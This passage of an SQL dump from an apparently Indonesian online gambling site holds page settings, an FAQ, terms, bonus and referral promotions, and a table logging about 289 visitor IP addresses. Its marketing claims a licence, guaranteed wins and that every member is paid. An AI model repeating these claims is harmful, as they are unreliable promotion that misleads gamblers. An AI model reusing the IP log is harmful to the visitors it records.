GOLDWIN777<br>DEPOSIT TIDAK SESUAI SITUS PENIPUAN</font></b></span></div><h3></h3>'),
(11, 'pusat_bantuan', '<p style=\"font-size: 16px;\">FAQs2</p>\r\n    <p style=\"font-size: 14px;\">Bagaimana Cara Membuat Akun di IBOPLAY?</p>\r\n    <p>Cara membuat akun di IBOPLAY sangat mudah, silahkan klik tombol \"Daftar\" yang terletak di bagian kanan atas pada halaman utama IBOPLAY . Lalu isi semua informasi yang dibutuhkan secara tepat dan benar. Anda harus mengkonfirmasi bahwa anda setidaknya berusia 18 tahun untuk melengkapi pendaftaran anda.</p>\r\n    <p class=\"mb-5\">Kolom nama belakang anda tidak dapat dikosongkan. Jika anda tidak memiliki nama belakang (nama keluarga), maka anda dapat mengulang penulisan nama depan anda. Cotoh: Andi Andi.</p>\r\n    <p style=\"font-size: 14px;\">Mata Uang Apa Saja yang Diterima di IBOPLAY?</p>\r\n    <p>\r\n      Dibawah ini adalah daftar semua mata uang yang diterima oleh IBOPLAY :\r\n      </p><ol>\r\n        <li>Rupiah (IDR)</li>\r\n      </ol>\r\n    <p></p>\r\n    <p class=\"mb-5\">\r\n      <span class=\"d-block mb-2\">Catatan:</span>\r\n      1 Unit Rupiah (IDR) di IBOPLAY akan mewakili Rp. 1.000.\r\n    </p>\r\n    <p style=\"font-size: 14px;\">Bagaimana Cara Menyetor Dana Ke Akun IBOPLAY Saya?</p>\r\n    <p class=\"mb-5\">\r\n      Sebelum anda dapat bertaruh, anda perlu melakukan deposit dana ke akun anda menggunakan salah satu opsi deposit berikut ini:\r\n      </p><ol>\r\n        <li>Bank Lokal</li>\r\n        <li>Online Deposit</li>\r\n      </ol>\r\n    <p></p>\r\n    <p style=\"font-size: 14px;\">Adakah batasan minimal dalam melakukan betting?</p>\r\n    <p class=\"mb-5\">\r\n      Setiap permainan yang disediakan oleh IBOPLAY memiliki taruhan minimal sesuai permainan yang dipilih. Semua informasi tersedia ketika member sudah masuk ke dalam permainan.\r\n    </p>\r\n    <p style=\"font-size: 14px;\">Apakah situs kami terpercaya?</p>\r\n    <p class=\"mb-5\">\r\n      Situs kami merupakan situs resmi yang berkantor di Manila, Filipina dimana sebelum kami beroperasi kami sudah mendapatkan lisensi PACGOR sebagai tanda bahwa kami web terpercaya. Seluruh transaksi data keuangan dan privasi anda menjadi salah satu prioritas kami dan tidak ada satupun member kami yang tidak dibayar kemenangannya.\r\n    </p>', '', ''),
(12, 'syarat_dan_ketentuan', '<p style=\"font-size: 16px;\">TERMS &amp; CONDITIONS</p>\r\n    <p style=\"font-size: 14px;\">Privacy Policy</p>\r\n    <p class=\"mb-5\">We recognize and respect your right to privacy. Keeping your data safe is our paramount concern. We will keep all of your personal data private and will not disclose this information to any third party unless required to do so by applicable laws and regulations or a court order; with the exception that we reserve the right to disclose and transfer your personal data to our respective payment settlement service providers and financial institutions to the extent necessary for the completion of payments for services provided through our website. All personal information supplied by users is transmitted via Secure Socket (SSL 128 bit encryption Standard) and is stored in secure operating environments that are not accessible by the public. Internal access to all data is limited and strictly monitored.</p>\r\n    <p style=\"font-size: 14px;\">Disclaimer</p>\r\n    <p class=\"mb-5\">The information contained in IBOPLAY .com is for general information purposes only. This information is provided by our site and while we strive to maintain up-to-date and correct information, we make no representations or warranties of any kind, express or implied, regarding the completeness, accuracy, reliability, suitability or availability with respect to the website or information , products, services or related images contained on the website for any purpose. Therefore, the risk is borne by you yourself about the dependence of placing that information.</p>', '', ''),
(13, 'responsible_gaming', '<p style=\"font-size: 16px;\">123</p>', '', ''),
(14, 'tentang', '<p style=\"font-size: 16px;\">TENTANG KAMI</p>\r\n    <p style=\"font-size: 14px;\">IBOPLAY</p>\r\n    <p class=\"mb-5\">\r\n      Selamat datang di IBOPLAY , situs taruhan online terkemuka di Asia, yang menyediakan beragam produk permainan terbaik di Asia.\r\n      <br><br>\r\n      IBOPLAY adalah situs permainan taruhan olahraga hingga kasino terkemuka dan terpercaya di Asia, IBOPLAY menawarkan pengalaman judi online terbaik dengan berbagai variasi permainan kasino & sportsbook yang dapat dipilih dengan odds paling kompetitif dalam dunia judi sepak bola. Kami menawarkan rata-rata 10.000 permainan Olahraga yang berbeda setiap bulan dan berbagai kompetisi di seluruh dunia dalam IBOPLAY  Sportsbook, sementara total lebih dari 100 permainan kasino dari variasi bakarat, slot, roulette dan permainan kasino lainnya dapat dimainkan di IBOPLAY  Casino.\r\n    </p>\r\n\r\n    <p style=\"font-size: 14px;\">KEAMANAN</p>\r\n    <p class=\"mb-5\">\r\n      Domain aman dan privat serta integritas produk kami adalah poros fundamental dari pengalaman taruhan online di IBOPLAY . Kami selalu mengutamakan keamanan tercanggih dan memperbaharui semua permainan serta proses-proses kami secara berkala, demi memastikan pengalaman permainan online Anda 100% aman dan adil. Kami selalu mengutamakan menjaga kerahasiaan informasi Anda, dan kami tidak akan pernah membagikannya ataupun menjualnya ke pihak ketiga, kecuali diharuskan sesuai dengan yang disebutkan di Kebijakan Privasi kami.\r\n    </p>\r\n\r\n    <p style=\"font-size: 14px;\">PELAYANAN PELANGGAN</p>\r\n    <p class=\"mb-5\">\r\n      Didukung layanan pelanggan 24 jam, yang tersedia 7 hari seminggu, staf kami yang ramah dan profesional akan memastikan bahwa semua masalah yang Anda hadapi akan ditangani dengan cepat, efisien, dan secara ramah. Kami memberikan prioritas tinggi untuk memastikan sistem pembayaran yang aman dan memberikan kerahasiaan informasi pribadi.\r\n      <br><br>\r\n      Misi utama kami adalah selalu memberikan pengalaman taruhan online terbaik bagi pemain yang bertanggung jawab.\r\n      Silahkan hubungi kami melalui Livechat dan Whatsapp, dengan saran dan komentar Anda.\r\n      <br><br>\r\n      Kami memilki beberapa metode pembayaran yang mudah dan aman, demi kenyamanan Anda. Kami mengikuti kebijakan kenali pelanggan Anda (KYC) dan anti-pencucian uang (AML), dan kami bekerja sama dengan badan keuangan serta badan pengatur demi memastikan ketaatan berstandar tertinggi pada hukum dan peraturan.\r\n    </p>\r\n\r\n    <p style=\"font-size: 14px;\">PROGRAM DAN HIBURAN</p>\r\n    <p class=\"mb-5\">\r\n      Di IBOPLAY , kami berusaha untuk memberikan yang terbaik dalam permainan dan layanan online untuk menawarkan pengalaman unik & terbaik bagi pelanggan kami. Kami memiliki beberapa program berhadiah, yang memberikan pelanggan kami berbagai hadiah yang benar-benar layak untuk para pemain. Bermain di IBOPLAY tidak hanya menyenangkan dan menghibur, tetapi juga sangat menguntungkan!\r\n    </p>', '', ''),
(15, 'marquee_pengumuman', 'Harap diperhatikan kembali pada saat melakukan deposit, hati-hati penipuan mengatasnamakan GOLDWIN777.', '#000000', '#c9a561'),
(16, 'logo', '4137981735_7281555116_goldwin777.gif', '', ''),
(17, 'favicon', '6494026838_goldwin777.gif', '', ''),
(18, 'judul_website', 'Situs GoldWin777 Bandar Judi Live Slot Server Thailan Anti Rungkad, Dijamin Maxwin New Member', '', ''),
(19, 'warna_utama', '#27185d', '', ''),
(20, 'logo_admin_light', '7281555116_goldwin777.gif', '', ''),
(21, 'logo_admin_dark', '4556732267_goldwin777.gif', '', ''),
(22, 'logo_admin_sm', '8625016196_goldwin777.gif', '', ''),
(23, 'bg_jackpot', '9482786182_3.png', '#ffffff', ''),
(24, 'bg_body', '1546938986_photo-1554050857-c84a8abdb5e2.jpeg', '', ''),
(25, 'tombol_masuk', 'tombol-masuk.png', '#c8c101', ''),
(26, 'tombol_daftar', 'tombol-daftar.png', '#ffffff', ''),
(27, 'bg_menu', 'bg-menu.jpg', '', ''),
(28, 'hot_games', 'hot-games.png', '', ''),
(29, 'slots', 'slots.png', '', ''),
(30, 'live_casino', 'casino.png', '', ''),
(31, 'sports', 'sports.png', '', ''),
(32, 'arcade', 'arcade.png', '', ''),
(33, 'poker', 'poker.png', '', ''),
(34, 'togel', 'others.png', '', ''),
(35, 'bg_bank', '7295428602_20230727_085040.png', '#ffffff', '');

-- --------------------------------------------------------

--
-- Table structure for table `pengunjung`
--

CREATE TABLE `pengunjung` (
  `id_pengunjung` int(11) NOT NULL,
  `ip_pengunjung` varchar(255) NOT NULL,
  `tanggal_pengunjung` int(11) NOT NULL,
  `bulan_pengunjung` int(11) NOT NULL,
  `tahun_pengunjung` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `pengunjung`
--

INSERT INTO `pengunjung` (`id_pengunjung`, `ip_pengunjung`, `tanggal_pengunjung`, `bulan_pengunjung`, `tahun_pengunjung`) VALUES
(1, '110.137.37.240', 20, 9, 2023),
(2, '180.245.59.199', 1, 3, 2024),
(3, '182.253.233.151', 1, 3, 2024),
(4, '110.50.80.198', 1, 3, 2024),
(5, '114.10.118.219', 1, 3, 2024),
(6, '103.140.78.218', 1, 3, 2024),
(7, '101.255.117.241', 1, 3, 2024),
(8, '114.124.211.226', 1, 3, 2024),
(9, '182.2.79.148', 1, 3, 2024),
(10, '182.2.77.253', 1, 3, 2024),
(11, '36.85.2.100', 1, 3, 2024),
(12, '112.215.224.177', 1, 3, 2024),
(13, '114.122.37.191', 1, 3, 2024),
(14, '180.242.70.129', 1, 3, 2024),
(15, '175.45.186.197', 1, 3, 2024),
(16, '87.98.140.71', 1, 3, 2024),
(17, '112.215.224.193', 1, 3, 2024),
(18, '203.78.125.109', 1, 3, 2024),
(19, '203.78.126.26', 1, 3, 2024),
(20, '112.215.147.69', 1, 3, 2024),
(21, '140.213.143.235', 1, 3, 2024),
(22, '120.188.92.25', 1, 3, 2024),
(23, '180.242.68.230', 1, 3, 2024),
(24, '120.188.39.196', 1, 3, 2024),
(25, '27.124.95.142', 1, 3, 2024),
(26, '104.28.159.62', 1, 3, 2024),
(27, '114.10.98.165', 1, 3, 2024),
(28, '120.188.92.76', 1, 3, 2024),
(29, '20.163.64.82', 1, 3, 2024),
(30, '114.79.4.162', 1, 3, 2024),
(31, '87.98.153.11', 2, 3, 2024),
(32, '114.10.24.56', 2, 3, 2024),
(33, '8.41.221.51', 2, 3, 2024),
(34, '103.150.197.95', 2, 3, 2024),
(35, '101.255.165.62', 2, 3, 2024),
(36, '120.188.5.231', 2, 3, 2024),
(37, '114.79.5.215', 2, 3, 2024),
(38, '140.213.0.225', 2, 3, 2024),
(39, '114.79.5.117', 2, 3, 2024),
(40, '120.188.39.244', 2, 3, 2024),
(41, '114.4.212.35', 2, 3, 2024),
(42, '114.4.212.35', 2, 3, 2024),
(43, '140.213.149.92', 2, 3, 2024),
(44, '114.10.112.141', 2, 3, 2024),
(45, '114.10.99.220', 2, 3, 2024),
(46, '182.3.138.234', 2, 3, 2024),
(47, '182.1.235.87', 3, 3, 2024),
(48, '140.213.143.192', 3, 3, 2024),
(49, '120.188.93.147', 3, 3, 2024),
(50, '110.138.82.111', 3, 3, 2024),
(51, '182.4.70.182', 3, 3, 2024),
(52, '95.108.213.244', 3, 3, 2024),
(53, '5.255.231.89', 3, 3, 2024),
(54, '213.180.203.170', 3, 3, 2024),
(55, '213.180.203.155', 3, 3, 2024),
(56, '111.94.70.229', 3, 3, 2024),
(57, '114.79.5.77', 3, 3, 2024),
(58, '118.98.26.6', 3, 3, 2024),
(59, '120.188.95.172', 3, 3, 2024),
(60, '114.79.4.69', 3, 3, 2024),
(61, '118.136.30.81', 3, 3, 2024),
(62, '182.3.71.237', 3, 3, 2024),
(63, '114.4.79.39', 3, 3, 2024),
(64, '103.189.123.7', 3, 3, 2024),
(65, '150.129.59.4', 3, 3, 2024),
(66, '103.189.123.6', 3, 3, 2024),
(67, '114.4.213.160', 3, 3, 2024),
(68, '150.129.59.5', 3, 3, 2024),
(69, '128.14.66.130', 3, 3, 2024),
(70, '180.252.113.35', 3, 3, 2024),
(71, '203.78.114.157', 3, 3, 2024),
(72, '182.5.9.77', 3, 3, 2024),
(73, '103.26.211.4', 3, 3, 2024),
(74, '103.175.82.68', 3, 3, 2024),
(75, '114.79.7.251', 3, 3, 2024),
(76, '114.79.4.130', 3, 3, 2024),
(77, '114.79.2.157', 3, 3, 2024),
(78, '114.79.3.230', 3, 3, 2024),
(79, '114.79.6.38', 3, 3, 2024),
(80, '180.252.114.2', 3, 3, 2024),
(81, '112.215.225.105', 3, 3, 2024),
(82, '114.79.7.118', 3, 3, 2024),
(83, '114.79.4.218', 3, 3, 2024),
(84, '114.79.46.207', 3, 3, 2024),
(85, '115.178.238.46', 3, 3, 2024),
(86, '110.50.81.200', 3, 3, 2024),
(87, '172.56.113.119', 3, 3, 2024),
(88, '49.44.80.168', 3, 3, 2024),
(89, '49.44.83.232', 3, 3, 2024),
(90, '31.211.30.6', 3, 3, 2024),
(91, '27.124.95.255', 3, 3, 2024),
(92, '114.122.39.185', 3, 3, 2024),
(93, '180.242.68.31', 3, 3, 2024),
(94, '66.220.149.20', 3, 3, 2024),
(95, '31.13.115.2', 3, 3, 2024),
(96, '31.13.115.119', 3, 3, 2024),
(97, '114.79.4.110', 3, 3, 2024),
(98, '180.244.129.231', 3, 3, 2024),
(99, '223.255.230.78', 3, 3, 2024),
(100, '103.10.66.28', 3, 3, 2024),
(101, '182.2.143.59', 3, 3, 2024),
(102, '182.2.143.47', 3, 3, 2024),
(103, '182.2.143.35', 3, 3, 2024),
(104, '223.255.229.31', 3, 3, 2024),
(105, '95.108.213.108', 3, 3, 2024),
(106, '114.79.0.64', 3, 3, 2024),
(107, '116.206.28.3', 3, 3, 2024),
(108, '120.188.5.152', 3, 3, 2024),
(109, '66.220.149.14', 3, 3, 2024),
(110, '180.244.162.97', 3, 3, 2024),
(111, '36.85.3.179', 3, 3, 2024),
(112, '120.188.34.100', 3, 3, 2024),
(113, '95.108.213.140', 3, 3, 2024),
(114, '114.10.139.179', 3, 3, 2024),
(115, '54.214.205.186', 3, 3, 2024),
(116, '116.206.28.51', 3, 3, 2024),
(117, '34.220.168.44', 3, 3, 2024),
(118, '114.10.19.202', 3, 3, 2024),
(119, '114.79.7.38', 3, 3, 2024),
(120, '103.171.163.186', 3, 3, 2024),
(121, '113.197.108.36', 3, 3, 2024),
(122, '110.138.81.242', 3, 3, 2024),
(123, '114.4.214.62', 3, 3, 2024),
(124, '223.255.229.66', 3, 3, 2024),
(125, '104.28.219.245', 3, 3, 2024),
(126, '104.28.251.244', 3, 3, 2024),
(127, '104.28.219.244', 3, 3, 2024),
(128, '104.28.156.142', 3, 3, 2024),
(129, '87.250.224.231', 3, 3, 2024),
(130, '103.255.156.26', 3, 3, 2024),
(131, '140.213.137.207', 3, 3, 2024),
(132, '112.215.251.178', 3, 3, 2024),
(133, '112.215.226.176', 3, 3, 2024),
(134, '180.254.66.9', 3, 3, 2024),
(135, '95.32.241.188', 3, 3, 2024),
(136, '188.18.226.139', 3, 3, 2024),
(137, '202.43.172.5', 3, 3, 2024),
(138, '182.2.144.247', 3, 3, 2024),
(139, '103.89.162.2', 3, 3, 2024),
(140, '182.3.43.118', 3, 3, 2024),
(141, '5.255.231.55', 3, 3, 2024),
(142, '114.122.79.218', 3, 3, 2024),
(143, '223.255.229.28', 3, 3, 2024),
(144, '103.189.123.4', 3, 3, 2024),
(145, '173.252.95.6', 3, 3, 2024),
(146, '66.220.149.18', 3, 3, 2024),
(147, '173.252.107.119', 3, 3, 2024),
(148, '69.63.189.7', 3, 3, 2024),
(149, '103.153.134.20', 3, 3, 2024),
(150, '124.158.184.181', 3, 3, 2024),
(151, '125.164.20.75', 3, 3, 2024),
(152, '125.164.22.6', 3, 3, 2024),
(153, '125.164.23.143', 3, 3, 2024),
(154, '173.252.127.21', 3, 3, 2024),
(155, '180.214.232.11', 3, 3, 2024),
(156, '120.188.4.133', 3, 3, 2024),
(157, '112.215.228.176', 3, 3, 2024),
(158, '113.210.105.178', 3, 3, 2024),
(159, '103.138.49.31', 3, 3, 2024),
(160, '112.215.246.116', 3, 3, 2024),
(161, '114.122.230.229', 3, 3, 2024),
(162, '149.154.161.218', 3, 3, 2024),
(163, '180.252.116.229', 3, 3, 2024),
(164, '182.3.43.228', 3, 3, 2024),
(165, '114.79.6.48', 3, 3, 2024),
(166, '182.3.43.240', 3, 3, 2024),
(167, '182.3.43.252', 3, 3, 2024),
(168, '114.10.116.198', 3, 3, 2024),
(169, '113.210.105.7', 3, 3, 2024),
(170, '114.79.7.229', 3, 3, 2024),
(171, '95.108.213.91', 3, 3, 2024),
(172, '103.3.221.121', 3, 3, 2024),
(173, '69.171.251.5', 3, 3, 2024),
(174, '182.253.96.20', 3, 3, 2024),
(175, '182.253.96.22', 3, 3, 2024),
(176, '223.255.225.237', 3, 3, 2024),
(177, '180.244.166.26', 3, 3, 2024),
(178, '112.215.242.24', 3, 3, 2024),
(179, '180.242.68.108', 3, 3, 2024),
(180, '180.242.68.108', 3, 3, 2024),
(181, '182.1.233.32', 3, 3, 2024),
(182, '114.10.24.199', 3, 3, 2024),
(183, '182.4.199.87', 3, 3, 2024),
(184, '180.214.233.75', 3, 3, 2024),
(185, '203.78.124.91', 3, 3, 2024),
(186, '112.215.211.161', 3, 3, 2024),
(187, '114.79.6.54', 3, 3, 2024),
(188, '182.2.71.98', 3, 3, 2024),
(189, '114.122.111.209', 3, 3, 2024),
(190, '104.28.160.165', 3, 3, 2024),
(191, '140.213.24.115', 3, 3, 2024),
(192, '140.213.18.207', 3, 3, 2024),
(193, '114.79.0.143', 3, 3, 2024),
(194, '182.1.228.82', 3, 3, 2024),
(195, '114.79.7.64', 3, 3, 2024),
(196, '114.10.104.49', 3, 3, 2024),
(197, '114.79.1.132', 3, 3, 2024),
(198, '203.78.124.42', 3, 3, 2024),
(199, '116.206.9.15', 3, 3, 2024),
(200, '114.10.28.58', 3, 3, 2024),
(201, '173.252.87.2', 3, 3, 2024),
(202, '36.78.84.143', 3, 3, 2024),
(203, '114.125.246.207', 3, 3, 2024),
(204, '36.71.84.193', 3, 3, 2024),
(205, '95.154.114.72', 3, 3, 2024),
(206, '187.252.82.136', 3, 3, 2024),
(207, '176.12.98.5', 3, 3, 2024),
(208, '201.182.130.68', 3, 3, 2024),
(209, '114.79.5.91', 3, 3, 2024),
(210, '5.255.231.16', 3, 3, 2024),
(211, '173.252.111.9', 3, 3, 2024),
(212, '140.213.167.128', 3, 3, 2024),
(213, '180.214.232.91', 3, 3, 2024),
(214, '180.244.161.161', 3, 3, 2024),
(215, '120.188.5.170', 3, 3, 2024),
(216, '110.50.80.197', 3, 3, 2024),
(217, '95.108.213.131', 3, 3, 2024),
(218, '173.252.83.5', 3, 3, 2024),
(219, '114.125.244.89', 3, 3, 2024),
(220, '180.214.232.83', 3, 3, 2024),
(221, '114.10.135.50', 3, 3, 2024),
(222, '173.252.111.13', 3, 3, 2024),
(223, '140.213.169.86', 3, 3, 2024),
(224, '182.2.132.68', 3, 3, 2024),
(225, '114.4.214.137', 3, 3, 2024),
(226, '182.1.231.97', 3, 3, 2024),
(227, '114.79.2.175', 3, 3, 2024),
(228, '114.79.55.178', 3, 3, 2024),
(229, '140.213.112.180', 3, 3, 2024),
(230, '140.213.115.157', 3, 3, 2024),
(231, '112.215.147.30', 3, 3, 2024),
(232, '114.79.6.14', 3, 3, 2024),
(233, '203.78.125.233', 3, 3, 2024),
(234, '182.253.94.175', 3, 3, 2024),
(235, '213.180.203.11', 3, 3, 2024),
(236, '182.1.90.253', 3, 3, 2024),
(237, '140.213.143.187', 3, 3, 2024),
(238, '203.78.126.60', 4, 3, 2024),
(239, '140.213.14.105', 4, 3, 2024),
(240, '178.46.127.101', 4, 3, 2024),
(241, '203.78.125.158', 4, 3, 2024),
(242, '180.242.71.48', 4, 3, 2024),
(243, '140.213.13.205', 4, 3, 2024),
(244, '94.140.150.5', 4, 3, 2024),
(245, '5.227.31.43', 4, 3, 2024),
(246, '178.34.150.135', 4, 3, 2024),
(247, '112.215.174.99', 4, 3, 2024),
(248, '140.213.115.53', 4, 3, 2024),
(249, '112.215.170.75', 4, 3, 2024),
(250, '180.243.9.253', 4, 3, 2024),
(251, '112.215.231.98', 4, 3, 2024),
(252, '112.215.233.94', 4, 3, 2024),
(253, '112.215.226.164', 4, 3, 2024),
(254, '112.215.252.165', 4, 3, 2024),
(255, '114.79.2.66', 4, 3, 2024),
(256, '64.233.173.197', 4, 3, 2024),
(257, '64.233.173.196', 4, 3, 2024),
(258, '140.213.137.104', 4, 3, 2024),
(259, '110.137.72.104', 4, 3, 2024),
(260, '103.81.220.228', 4, 3, 2024),
(261, '103.156.114.26', 4, 3, 2024),
(262, '114.10.142.212', 4, 3, 2024),
(263, '140.213.18.182', 4, 3, 2024),
(264, '140.213.169.50', 4, 3, 2024),
(265, '114.10.125.205', 4, 3, 2024),
(266, '180.214.233.81', 4, 3, 2024),
(267, '140.213.22.49', 4, 3, 2024),
(268, '140.213.129.215', 4, 3, 2024),
(269, '51.89.211.248', 4, 3, 2024),
(270, '116.206.8.62', 4, 3, 2024),
(271, '114.10.71.226', 4, 3, 2024),
(272, '112.215.224.71', 4, 3, 2024),
(273, '69.63.189.9', 4, 3, 2024),
(274, '114.10.143.241', 4, 3, 2024),
(275, '114.79.2.164', 4, 3, 2024),
(276, '116.206.8.24', 4, 3, 2024),
(277, '66.220.149.16', 4, 3, 2024),
(278, '114.4.82.226', 4, 3, 2024),
(279, '103.156.115.78', 4, 3, 2024),
(280, '180.248.22.50', 4, 3, 2024),
(281, '103.189.123.8', 4, 3, 2024),
(282, '173.252.111.8', 4, 3, 2024),
(283, '114.142.170.62', 4, 3, 2024),
(284, '104.28.156.139', 4, 3, 2024),
(285, '182.2.133.84', 4, 3, 2024),
(286, '182.2.132.192', 4, 3, 2024),
(287, '128.1.190.217', 4, 3, 2024),
(288, '114.10.68.154', 4, 3, 2024),
(289, '::1', 4, 3, 2024);

-- --------------------------------------------------------

--
-- Table structure for table `promosi`
--

CREATE TABLE `promosi` (
  `id_promosi` int(11) NOT NULL,
  `gambar_promosi` varchar(255) NOT NULL,
  `judul_promosi` varchar(255) NOT NULL,
  `detail_promosi` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `promosi`
--

INSERT INTO `promosi` (`id_promosi`, `gambar_promosi`, `judul_promosi`, `detail_promosi`) VALUES
(14, '5131899603_20230918_042216.png', 'Bonus New Member 100%', '<p><font style=\"vertical-align: inherit;\"><font style=\"vertical-align: inherit;\"><b><font style=\"vertical-align: inherit;\"><font style=\"vertical-align: inherit;\" color=\"#ffffff\">SYARAT &amp; KETENTUAN*</font></font></b></font></font></p><ul><li><font color=\"#ffffff\"><span style=\"background-color: var(--vz-card-bg); font-family: var(--vz-body-font-family); font-size: var(--vz-body-font-size); text-align: var(--vz-body-text-align);\"><font style=\"vertical-align: inherit;\"><font style=\"vertical-align: inherit;\"><font style=\"vertical-align: inherit;\"><font style=\"vertical-align: inherit;\"><span style=\"font-weight: var(--vz-body-font-weight);\">Promo ini berlaku untuk Member Baru </span><b>KING808</b></font></font></font></font></span><b style=\"background-color: var(--vz-card-bg); font-family: var(--vz-body-font-family); font-size: var(--vz-body-font-size); text-align: var(--vz-body-text-align);\"><font style=\"vertical-align: inherit;\"><font style=\"vertical-align: inherit;\"><font style=\"vertical-align: inherit;\"><font style=\"vertical-align: inherit;\">&nbsp;</font></font></font></font></b><span style=\"background-color: var(--vz-card-bg); font-family: var(--vz-body-font-family); font-size: var(--vz-body-font-size); font-weight: var(--vz-body-font-weight); text-align: var(--vz-body-text-align);\"><font style=\"vertical-align: inherit;\"><font style=\"vertical-align: inherit;\"><font style=\"vertical-align: inherit;\"><font style=\"vertical-align: inherit;\">.</font></font></font></font></span></font></li><li><font style=\"vertical-align: inherit;\"><font style=\"vertical-align: inherit;\"><font style=\"vertical-align: inherit;\"><font style=\"vertical-align: inherit;\" color=\"#ffffff\"><font style=\"vertical-align: inherit;\"><font style=\"vertical-align: inherit;\">Minimal Deposit untuk mengikuti Promo ini adalah </font></font><b><font style=\"vertical-align: inherit;\"><font style=\"vertical-align: inherit;\">Rp 100.000.</font></font></b></font></font></font></font></li><li><font style=\"vertical-align: inherit;\"><font style=\"vertical-align: inherit;\" color=\"#ffffff\"><font style=\"vertical-align: inherit;\"><font style=\"vertical-align: inherit;\">Bonus Maksimal yang diberikan sebesar </font></font><b><font style=\"vertical-align: inherit;\"><font style=\"vertical-align: inherit;\">Rp 1.000.000.</font></font></b></font></font></li><li><font color=\"#ffffff\">Tanpa TurnOver</font></li><li><font style=\"vertical-align: inherit;\"><font style=\"vertical-align: inherit;\"><font style=\"vertical-align: inherit;\"><font style=\"vertical-align: inherit;\" color=\"#ffffff\">Hanya berlaku untuk permainan Slot.</font></font></font></font></li><li><span style=\"background-color: var(--vz-card-bg); font-family: var(--vz-body-font-family); font-size: var(--vz-body-font-size); font-weight: var(--vz-body-font-weight); text-align: var(--vz-body-text-align);\"><font style=\"vertical-align: inherit;\"><font style=\"vertical-align: inherit;\" color=\"#ffffff\">Bonus tidak berlaku dipermainan SEPERTI Money Roll™ , 888 Gold™ , Irish Charms™ , Triple Tigers™ , Diamonds are Forever 3 Lines .</font></font></span></li><li><font style=\"vertical-align: inherit;\"><font style=\"vertical-align: inherit;\" color=\"#ffffff\"><b>Bonus New Member 100%</b>&nbsp;diberikan diawal setelah player melakukan Deposit.</font></font></li><li><font style=\"vertical-align: inherit;\"><font style=\"vertical-align: inherit;\"><font style=\"vertical-align: inherit;\"><font style=\"vertical-align: inherit;\" color=\"#ffffff\">Harap Cantumkan 3 Digit Kode Unik <b>100</b> pada Nominal Deposit. Contoh (<b>Rp 100.100</b>)</font></font></font></font></li><li><font style=\"vertical-align: inherit;\"><font style=\"vertical-align: inherit;\"><font style=\"vertical-align: inherit;\"><font style=\"vertical-align: inherit;\" color=\"#ffffff\">Player wajib klaim ke Customer Service kami melalui Live Chat atau Klik Disini untuk mengikuti promo ini.</font></font></font></font></li><li><font style=\"vertical-align: inherit;\"><font style=\"vertical-align: inherit;\" color=\"#ffffff\">Apabila ditemukan adanya indikasi kecurangan seperti Bonus Hunter, dan Kesamaan IP, maka kami berhak menarik bonus dan semua kemenangan.</font></font></li><li><font style=\"vertical-align: inherit;\"><font style=\"vertical-align: inherit;\" color=\"#ffffff\">Pihak <b>KING808</b>&nbsp;berhak untuk mengubah, menolak,membatalkan atau menutup semua promosi sesuai dengan ketentuan yang berlaku tanpa ada pemberitahuan sebelumnya.</font></font></li><li><font style=\"vertical-align: inherit;\"><font style=\"vertical-align: inherit;\" color=\"#ffffff\">Member yang mengikuti PROMO ini WAJIB menerima dan mengikuti semua peraturan dan persyaratan promosi ini.</font></font></li></ul>'),
(19, '1891303439_20230918_041439.png', 'Bonus Referral 15%', '<p style=\"text-align: left;\"><b><font style=\"vertical-align: inherit;\"><font style=\"vertical-align: inherit;\" color=\"#ffffff\">KING808 MEMBERIKAN PENDAPATAN PASIF SEUMUR HIDUP UNTUK ANDA</font></font></b></p><p style=\"text-align: justify;\"><font style=\"vertical-align: inherit;\"><font style=\"vertical-align: inherit;\" color=\"#ffffff\">Manfaatkan BONUS Referral yang dapat kami berikan dari persenan KOMISI TERBAIK dan TERBESAR untuk Anda untuk semua permainan yang ada di <b>KING808</b>.</font></font></p><p style=\"text-align: justify;\"><font style=\"vertical-align: inherit;\"><font style=\"vertical-align: inherit;\" color=\"#ffffff\">Adapun Bonus Referral dari kami berkisar dari 2% hingga 15% untuk semua jenis permainan di <b>KING808</b>.</font></font></p><p style=\"text-align: justify;\"><font color=\"#ffffff\"><span style=\"background-color: var(--vz-card-bg); font-family: var(--vz-body-font-family); font-size: var(--vz-body-font-size);\"><font style=\"vertical-align: inherit;\"><font style=\"vertical-align: inherit;\"><span style=\"font-weight: var(--vz-body-font-weight);\">aranya sangat mudah, Anda hanya diminta mereferensikan teman Anda untuk melakukan pendaftaran di </span><b>KING808</b><span style=\"font-weight: var(--vz-body-font-weight);\">.</span></font></font></span><br></font></p><p style=\"text-align: justify;\"><font color=\"#ffffff\"><span style=\"background-color: var(--vz-card-bg); font-family: var(--vz-body-font-family); font-size: var(--vz-body-font-size);\"><font style=\"vertical-align: inherit;\"><font style=\"vertical-align: inherit;\"><span style=\"font-weight: var(--vz-body-font-weight);\">Anda wajib mendaftar terlebih dahulu di </span><b>KING808</b><span style=\"font-weight: var(--vz-body-font-weight);\">&nbsp;(pendaftaran gratis).</span></font></font></span><br></font></p><p style=\"text-align: justify;\"><font color=\"#ffffff\"><span style=\"background-color: var(--vz-card-bg); font-family: var(--vz-body-font-family); font-size: var(--vz-body-font-size);\"><font style=\"vertical-align: inherit;\"><font style=\"vertical-align: inherit;\"><span style=\"font-weight: var(--vz-body-font-weight);\">Anda wajib memasukkan kode referral Anda (USERNAME Anda pada kolom referral pada formulir pendaftaran member </span><b>KING808</b><span style=\"font-weight: var(--vz-body-font-weight);\">), atau Anda juga dapat menggunakan link referral yang telah tersedia.</span></font></font></span><br></font></p><p style=\"text-align: justify;\"><span style=\"background-color: var(--vz-card-bg); font-family: var(--vz-body-font-family); font-size: var(--vz-body-font-size);\"><font style=\"vertical-align: inherit;\"><font style=\"vertical-align: inherit;\" color=\"#ffffff\"><span style=\"font-weight: var(--vz-body-font-weight);\">Withdraw / Penarikan Bonus referral bisa di lakukan jika nominal bonus referral yang Anda dapatkan minimal berjumlah </span><b>Rp 50.000</b><span style=\"font-weight: var(--vz-body-font-weight);\">,-.</span></font></font></span></p><p style=\"text-align: justify;\"><font style=\"vertical-align: inherit;\"><font style=\"vertical-align: inherit;\" color=\"#ffffff\">Sebarkanlah link yang Anda dapatkan dari menu REFERRAL setelah Anda melakukan login di <b>KING808</b>, maka Downline Anda yang mendaftar melalui link Referral Anda akan secara otomatis masuk sebagai downline Anda.</font></font></p><p style=\"text-align: justify;\"><font 